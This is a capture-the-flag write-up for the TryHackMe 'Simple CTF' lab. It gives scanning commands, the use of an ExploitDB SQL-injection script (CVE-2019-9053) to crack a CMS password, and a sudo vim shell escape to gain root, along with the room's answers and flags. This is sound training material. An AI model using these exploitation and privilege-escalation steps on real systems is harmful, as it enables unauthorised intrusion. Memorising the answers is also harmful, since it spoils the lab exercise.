# Simple CTF

###### tags: `Tryhackme` `Hacking`
---
**1. How many services are running under port 1000?**
    ~ 2
    
    * Command: sudo nmap -sV -sS -T4 -p- -vv 10.10.239.141 -oN portscan.txt
![](https://i.imgur.com/DBzvkEV.png)

2. What is running on the higher port?
    ~ ssh
    
**3. What's the CVE you're using against the application?**
    ~ CVE-2019-9053
    
    * 利用gobuster掃描所有可能的xpath，然後到simple那頁會看到公司名稱和版本號，利用這個資訊在Google查找，可以找到答案
    * Command: gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://10.10.215.51 -t 20 -o gobusterscan.txt
![](https://i.imgur.com/HaB3ZMz.png)
    
**4. To what kind of vulnerability is the application vulnerable?**
    ~ sqli
    * 這是一個SQL injection漏洞
    
**5. What's the password?**
    ~ secret
    * 利用exploitDB提供的python進行暴力破解
    * Command: 
        searchsploit CMS Made simple 2.2.10
        searchsploit -p 46635
        sudo python 46635.py -u http://10.10.239.141/simple --crack -w /usr/share/wordlists/rockyou.txt
![](https://i.imgur.com/dk4aKF2.png)


**6. Where can you login with the details obtained?**
    ~ ssh
    
**7. What's the user flag?**
    ~ G00d j0b, keep up!
    
**8. Is there any other user in the home directory? What's its name?**
    ~ sunbath
    
**9. What can you leverage to spawn a privileged shell?**
    ~ vim
    * 利用sudo vim -c 執行 '':!/bin/sh' 得到root權限(前提是當前使用者在sudoer裡面)
![](https://i.imgur.com/CqzBPpu.png)
    
**10. What's the root flag?**
    ~ W3ll d0n3. You made it!